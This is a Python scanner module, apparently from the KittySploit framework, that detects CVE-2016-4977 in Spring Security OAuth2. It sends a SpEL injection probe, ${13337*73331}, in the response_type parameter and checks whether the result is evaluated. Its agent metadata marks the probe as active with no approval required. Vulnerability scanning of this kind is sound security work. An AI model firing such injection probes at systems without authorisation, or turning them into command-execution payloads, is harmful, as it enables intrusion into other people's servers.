#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Security OAuth versions 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Security OAuth2 Remote Command Execution Detection',
        'description': 'Spring Security OAuth versions 2.0.0 to 2.0.9 and 1.0.0 to 1.0.5 contain a remote command execution vulnerability. When processing authorization requests using the whitelabel views, the response_type parameter value was executed as Spring SpEL which enabled a malicious user to trigger remote command execution via the crafting of the value for response_type.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'oauth2', 'oauth', 'rce', 'ssti', 'vulhub', 'spring', 'pivotal', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/README.md',
            'https://tanzu.vmware.com/security/cve-2016-4977',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-4977',
            'https://pivotal.io/security/cve-2016-4977',
            'http://www.openwall.com/lists/oss-security/2019/10/16/1',
        ],
        'cve': 'CVE-2016-4977',
    }

    def run(self):
        r = self.http_request(method="GET", path='/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test', allow_redirects=False)
        if not r or r.status_code != 400:
            return False
        body = r.text or ""
        body_any = ('Unsupported response types: [978015547]',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Spring Security OAuth2 Remote Command Execution detected",
                path='/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test',
            )
            return True
        return False

